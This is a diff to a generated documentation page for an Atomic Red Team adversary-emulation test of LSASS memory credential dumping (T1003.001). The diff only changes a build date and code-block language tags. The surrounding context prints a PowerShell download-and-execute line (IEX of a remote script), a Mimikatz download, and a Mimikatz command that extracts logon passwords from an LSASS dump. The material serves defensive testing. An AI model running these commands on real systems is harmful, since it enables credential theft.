@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1003.001"
 attack_technique_name: "OS Credential Dumping: LSASS Memory"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "command_prompt"
 aliases:
   - "453acf13-1dbd-47d7-b28a-172ce9228023"
@@ -59,13 +59,13 @@ Mimikatz must exist on disk at specified location (#{mimikatz_exe})
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Test-Path "#{mimikatz_exe}") {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1" -UseBasicParsing) 
 $releases = "https://api.github.com/repos/gentilkiwi/mimikatz/releases"
@@ -78,13 +78,13 @@ Lsass dump must exist at specified location (#{input_file})
 
 ### Prerequisite Check
 
-```text
+```powershell
 cmd /c "if not exist #{input_file} (exit /b 1)"
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 Write-Host "Create the lsass dump manually using the steps in the previous test (Dump LSASS.exe Memory using Windows Task Manager)"
 ```
 
@@ -95,7 +95,7 @@ Write-Host "Create the lsass dump manually using the steps in the previous test 
 
 ### Command
 
-```commandprompt
+```cmd
 "#{mimikatz_exe}" "sekurlsa::minidump #{input_file}" "sekurlsa::logonpasswords full" exit
 ```
 
